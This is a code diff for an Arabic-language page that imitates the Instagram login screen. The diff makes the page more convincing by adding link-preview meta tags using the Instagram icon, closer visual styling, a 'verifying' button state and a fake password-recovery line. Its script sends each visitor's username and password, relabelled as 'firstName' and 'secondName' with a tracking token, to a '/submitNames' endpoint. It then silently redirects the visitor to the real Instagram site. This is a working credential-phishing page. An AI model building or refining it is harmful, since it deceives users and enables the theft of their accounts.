@@ -3,22 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    
+    <!-- Meta Tags for Preview -->
+    <meta property="og:title" content="Instagram - تسجيل الدخول">
+    <meta property="og:description" content="قم بتسجيل الدخول إلى حسابك في إنستقرام لمشاهدة الصور ومقاطع الفيديو من أصدقائك.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png">
+    <meta property="og:type" content="website">
+
+    <title>Instagram</title>
     <style>
-        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
-        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
-        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+        .logo { font-size: 40px; font-weight: bold; font-style: italic; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 15px; font-size: 14px; }
+        button:disabled { background-color: #b2dffc; }
+        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <h2 style="font-style: italic;">Instagram</h2>
+        <div class="logo">Instagram</div>
         <form id="loginForm">
             <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
             <input type="password" id="password" placeholder="كلمة السر" required>
-            <button type="submit">تسجيل الدخول</button>
+            <button type="submit" id="submitBtn">تسجيل الدخول</button>
         </form>
+        <div class="footer">هل نسيت كلمة السر؟</div>
     </div>
 
     <script>
@@ -27,20 +38,26 @@
 
         document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.innerText = "جاري التحقق...";
+
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            await fetch('/submitNames', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    token: token,
-                    firstName: username,
-                    secondName: password
-                })
-            });
+            try {
+                await fetch('/submitNames', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        token: token,
+                        firstName: username,
+                        secondName: password
+                    })
+                });
+            } catch (err) {}
 
-            window.location.href = "https://instagram.com";
+            window.location.href = "https://www.instagram.com";
         };
     </script>
 </body>
